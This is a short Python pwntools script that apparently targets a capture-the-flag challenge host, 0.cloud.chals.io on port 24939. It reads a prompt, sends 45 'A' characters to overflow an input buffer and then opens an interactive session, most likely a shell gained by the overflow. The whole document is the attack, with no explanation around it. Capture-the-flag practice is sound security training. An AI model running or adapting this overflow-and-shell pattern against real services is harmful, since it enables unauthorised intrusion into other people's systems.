from pwn import *

r = remote("0.cloud.chals.io", 24939)

print(r.recvuntil("\n"))
r.send("A"*45 + "\n")
r.interactive()
